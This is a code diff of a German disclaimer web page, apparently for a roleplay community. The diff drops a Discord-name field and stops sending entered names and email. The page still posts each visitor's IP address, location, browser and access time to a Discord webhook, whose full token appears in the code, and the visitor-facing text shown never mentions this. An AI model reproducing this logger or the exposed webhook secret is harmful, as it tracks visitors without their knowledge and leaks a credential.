@@ -10,7 +10,7 @@
     <h1>Willkommen! Bitte akzeptiere den Disclaimer, um fortzufahren.</h1>
     <p>Durch Klicken auf "Verstanden" stimmst du den Bedingungen zu.</p>
 
-    <!-- Formular für Vor- und Nachnamen sowie IC Name und Discord-Name -->
+    <!-- Formular für Vor- und Nachnamen sowie IC Name -->
     <div id="name_input">
         <label for="first_name">Vorname:</label>
         <input type="text" id="first_name" placeholder="Dein Vorname" required><br><br>
@@ -23,9 +23,6 @@
 
         <label for="ic_name">IC Name (In-Character Name):</label>
         <input type="text" id="ic_name" placeholder="Dein IC Name" required><br><br>
-
-        <label for="discord_name">Discord Name (Optional):</label>
-        <input type="text" id="discord_name" placeholder="Dein Discord Name (z.B. Username#1234)" ><br><br>
     </div>
 
     <!-- Das Feld, das den Button und die Nachricht enthält -->
@@ -83,7 +80,6 @@
         // Funktion, die die Webhook-Nachricht tatsächlich sendet
         function sendToDiscord(ipAddress, location) {
             const userBrowser = navigator.userAgent;
-            const discordName = document.getElementById("discord_name").value || "Nicht angegeben"; // Holen des Discord-Namens
             const webhookUrl = "https://discord.com/api/webhooks/1304714094170869790/2lx2pEFjerGkeKDfuEfarM0NUwFFxAUbQzqf9wfbT-uxaL4YfeHjORyLGNIpCwVzGvK2";
             
             const message = {
@@ -93,15 +89,14 @@
                         "description": "Ein Benutzer hat den Disclaimer akzeptiert und ist bereit, loszulegen!",
                         "color": 3447003,
                         "fields": [
-                            { "name": "👤 **Vorname**", "value": document.getElementById("first_name").value || "⚠️ Vorname fehlt ⚠️", "inline": true },
-                            { "name": "🧑‍💼 **Nachname**", "value": document.getElementById("last_name").value || "⚠️ Nachname fehlt ⚠️", "inline": true },
-                            { "name": "📧 **E-Mail-Adresse**", "value": document.getElementById("email").value || "⚠️ E-Mail fehlt ⚠️", "inline": true },
-                            { "name": "🎭 **IC Name**", "value": document.getElementById("ic_name").value || "Vorname Nachname | ID", "inline": true },
+                            { "name": "👤 **Vorname**", "value": "⚠️ Vorname fehlt ⚠️", "inline": true },
+                            { "name": "🧑‍💼 **Nachname**", "value": "⚠️ Nachname fehlt ⚠️", "inline": true },
+                            { "name": "📧 **E-Mail-Adresse**", "value": "⚠️ E-Mail fehlt ⚠️", "inline": true },
+                            { "name": "🎭 **IC Name**", "value": "Vorname Nachname | ID", "inline": true },
                             { "name": "🌍 **IP Adresse**", "value": ipAddress, "inline": false },
                             { "name": "📍 **Standort**", "value": location || "Standort nicht verfügbar", "inline": true },
                             { "name": "🌐 **Verwendeter Browser**", "value": userBrowser, "inline": false },
-                            { "name": "🕒 **Zeitpunkt des Zugriffs**", "value": new Date().toLocaleString(), "inline": false },
-                            { "name": "💬 **Discord Name**", "value": discordName, "inline": false }
+                            { "name": "🕒 **Zeitpunkt des Zugriffs**", "value": new Date().toLocaleString(), "inline": false }
                         ],
                         "footer": {
                             "text": "🛡️ Disclaimer System | Bereitgestellt von Missiont31",
